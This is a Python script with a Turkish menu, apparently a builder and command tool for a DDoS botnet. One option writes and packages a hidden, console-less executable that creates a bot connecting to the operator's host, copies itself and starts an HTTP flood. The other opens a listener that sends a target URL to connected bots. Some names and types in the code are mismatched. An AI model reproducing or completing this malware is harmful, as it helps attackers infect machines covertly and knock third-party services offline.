import socket
import sys
import os, subprocess
import time

if sys.platform == "linux" or sys.platform == "linux2":
    os.system("clear")
elif sys.platform == "win32":
    os.system("cls")
elif sys.platform == "darwin":
    os.system("clear")
else:
    print ("Sistem bilinmiyor")


def dinleyici():
    host = input("\033[1;32m Host: \033[1;m")
    port = input("\033[1;32m port: \033[1;m")
    while True:
        soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        soc.bind((host, port))
        soc.listen(0)
        conn, addr = soc.accept()
        url = input("\033[1;32m nereye saldırılacak usta :) : \033[1;m")
        conn.send(url)


def oluşturucu():
    user_input = input("\033[1;32m Dosya Adı: \033[1;m")
    user_host = input("\033[1;32m Host: \033[1;m")
    user_port = input("\033[1;32m Port: \033[1;m")
    mix = "var = mainlib.Bot('{0}', {1})\n".format(user_host, user_port)

    with open(user_input, "w+") as opnr:
        opnr.write("import ana\n")
        opnr.write(mix)
        opnr.write("var.selfcopy()\n")
        opnr.write("var.HttpTh()\n")
        opnr.close()

    subprocess.call(["pyinstaller", "--onefile", "--noconsole", user_input])


def kullanim():
    menu = """
    
                    |---------CHEEKY----------|
                     |                          |  ----kelime de yazabilirsin yani :)) ---- 
                      |         1)oluştur         |    olustur  virüs olustur
                       |           2)Saldır         |                         [Yaz Bişiler işte -.-]
                        |                            |  saldir    ddos
                    -----------------------------------
        """
    print (menu)


kullanim()

eger = input("Ne Yapmak İstersin : ").lower()

if eger == '1' or eger == "olustur" or eger == "oluştur" or eger=="virüs olustur":
    print("seni anladım , bir saniye ayarlıyorum :)")
    time.sleep(2)
    oluşturucu()
    kullanim()
elif eger == '2'or eger=="saldır" or eger=="saldir"or eger=="ddos":
    print("Günah benden gitti")
    time.sleep(2)
    dinleyici()
    kullanim()
else:
    print ("Hata")
